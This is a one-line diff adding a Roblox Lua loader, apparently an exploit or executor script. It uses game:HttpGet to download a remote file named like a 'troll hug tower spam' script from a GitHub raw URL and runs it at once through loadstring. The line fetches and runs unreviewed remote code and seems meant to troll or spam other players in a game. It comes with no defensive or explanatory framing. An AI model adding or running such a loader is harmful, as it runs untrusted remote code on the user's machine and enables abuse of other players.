@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/troll-hug-tower-spam6-8tko4w9koeqklf.lua"))()
